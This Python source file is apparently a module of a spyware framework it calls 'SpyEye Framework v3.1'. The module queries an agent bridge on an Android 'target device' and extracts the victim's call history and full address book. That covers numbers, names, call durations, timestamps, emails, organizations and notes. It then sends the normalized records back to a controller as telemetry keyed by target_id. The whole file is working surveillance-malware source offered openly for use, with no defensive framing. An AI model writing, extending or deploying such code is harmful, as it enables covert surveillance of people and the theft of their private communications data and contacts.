"""
modules/call_contacts.py

Advanced Call Logs and Contacts Extraction Module for SpyEye Framework v3.1.
  - Interfaces with Android agent REST bridges to extract secure communication metadata.
  - Call Logs: Number, contact name, duration, precise timestamps, and categorized types (Incoming/Outgoing/Missed/Blocked).
  - Contacts: Full address book enumeration (Display Name, phone lists, email addresses, organizations, and notes).
  - Robust exception management and payload normalisation.
"""

import logging
import time
from typing import Any, Dict, List, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class CallContactsModule(BaseModule):
    """
    Extracts call histories and contact address books from Android target devices.

    Configuration parameters:
        action (str): "calls" | "contacts" | "both" (default: "both")
        limit (int): Maximum record count to fetch per category (default: 150)
        bridge_port (int): Local HTTP bridge port on the agent side (default: 8088)
    """

    def __init__(self, target_id: str, config: Optional[Dict[str, Any]] = None):
        super().__init__(target_id, config)
        self._result_callback = None

    def validate_config(self) -> bool:
        """Validate optional configuration parameters."""
        action = self.config.get("action", "both")
        if action not in ["calls", "contacts", "both"]:
            logger.error("[%s] Invalid action parameter: %s", self._module_name, action)
            return False
        return True

    def set_result_callback(self, callback) -> None:
        """Inject real-time telemetry callback function."""
        self._result_callback = callback

    def run(self) -> None:
        """Main execution thread querying the Android local bridge API."""
        action = self.config.get("action", "both")
        limit = int(self.config.get("limit", 150))
        bridge_port = int(self.config.get("bridge_port", 8088))

        logger.info("[%s] Initiating extraction — action=%s, limit=%d, port=%d", self._module_name, action, limit, bridge_port)

        extracted_data: Dict[str, Any] = {}

        try:
            import requests
            base_bridge_url = f"http://127.0.0.1:{bridge_port}"

            # Fetch Call Logs if requested
            if action in ("calls", "both"):
                calls_result = self._fetch_calls(base_bridge_url, limit)
                if calls_result is not None:
                    extracted_data["calls"] = calls_result

            # Fetch Address Book Contacts if requested
            if action in ("contacts", "both"):
                contacts_result = self._fetch_contacts(base_bridge_url, limit)
                if contacts_result is not None:
                    extracted_data["contacts"] = contacts_result

            if extracted_data:
                self._emit_result(extracted_data)
                logger.info("[%s] Successfully extracted target communications data.", self._module_name)
            else:
                self._emit_error("Android bridge returned empty records.")

        except requests.exceptions.ConnectionError:
            logger.error("[%s] Target Android local bridge is unreachable (ConnectionRefused).", self._module_name)
            self._emit_error("Android bridge unreachable — agent service offline")
        except Exception as exc:
            logger.exception("[%s] Unexpected failure during extraction: %s", self._module_name, exc)
            self._emit_error(f"Call/Contacts extraction error: {exc}")

    def _fetch_calls(self, base_url: str, limit: int) -> Optional[List[Dict[str, Any]]]:
        """Query and normalize call log records from the agent bridge."""
        import requests
        try:
            response = requests.get(
                f"{base_url}/calls/list",
                params={"limit": limit},
                timeout=12,
            )

            if response.status_code == 200:
                raw_json = response.json()
                calls_list = raw_json.get("calls", raw_json if isinstance(raw_json, list) else [])
                logger.info("[%s] Retrieved %d raw call log entries.", self._module_name, len(calls_list))

                normalized_calls = []
                for entry in calls_list:
                    raw_timestamp = entry.get("date", entry.get("timestamp", 0))
                    formatted_time = ""
                    try:
                        if raw_timestamp:
                            # Convert milliseconds epoch to readable human time string
                            formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(float(raw_timestamp) / 1000.0))
                    except Exception:
                        formatted_time = str(raw_timestamp)

                    normalized_calls.append({
                        "number": entry.get("number", entry.get("phoneNumber", "Unknown")),
                        "name": entry.get("name", entry.get("contactName", "Unknown Contact")),
                        "type": self._parse_call_type(entry.get("type", 0)),
                        "duration_seconds": entry.get("duration", 0),
                        "timestamp": raw_timestamp,
                        "formatted_date": formatted_time,
                    })
                return normalized_calls
            else:
                logger.warning("[%s] Calls endpoint responded with HTTP status code %d", self._module_name, response.status_code)
                return None

        except requests.RequestException as exc:
            logger.warning("[%s] Failed to fetch call logs: %s", self._module_name, exc)
            return None

    def _fetch_contacts(self, base_url: str, limit: int) -> Optional[List[Dict[str, Any]]]:
        """Query and normalize address book contacts from the agent bridge."""
        import requests
        try:
            response = requests.get(
                f"{base_url}/contacts/list",
                params={"limit": limit},
                timeout=12,
            )

            if response.status_code == 200:
                raw_json = response.json()
                contacts_list = raw_json.get("contacts", raw_json if isinstance(raw_json, list) else [])
                logger.info("[%s] Retrieved %d raw contact entries.", self._module_name, len(contacts_list))

                normalized_contacts = []
                for item in contacts_list:
                    normalized_contacts.append({
                        "name": item.get("name", item.get("displayName", "Unnamed")),
                        "phone_numbers": item.get("phoneNumbers", item.get("phones", [])),
                        "emails": item.get("emails", item.get("emailAddresses", [])),
                        "organization": item.get("organization", ""),
                        "notes": item.get("notes", ""),
                    })
                return normalized_contacts
            else:
                logger.warning("[%s] Contacts endpoint responded with HTTP status code %d", self._module_name, response.status_code)
                return None

        except requests.RequestException as exc:
            logger.warning("[%s] Failed to fetch contacts list: %s", self._module_name, exc)
            return None

    @staticmethod
    def _parse_call_type(call_type_code: Any) -> str:
        """Map Android internal call type integer codes to readable text identifiers."""
        mapping = {
            1: "INCOMING",
            2: "OUTGOING",
            3: "MISSED",
            4: "VOICEMAIL",
            5: "REJECTED",
            6: "BLOCKED",
        }
        try:
            code_int = int(call_type_code)
            return mapping.get(code_int, f"UNKNOWN_{code_int}")
        except (ValueError, TypeError):
            return "UNKNOWN"

    def _emit_result(self, payload_data: Dict[str, Any]) -> None:
        """Dispatch extracted telemetry back to the controller framework."""
        payload = {
            "target_id": self.target_id,
            "module": "call_contacts",
            "action": "result",
            "data": payload_data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            calls_count = len(payload_data.get("calls", []))
            contacts_count = len(payload_data.get("contacts", []))
            logger.info("[%s] Result summary — Calls: %d, Contacts: %d", self._module_name, calls_count, contacts_count)

    def _emit_error(self, message: str) -> None:
        """Dispatch error telemetry notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "call_contacts",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)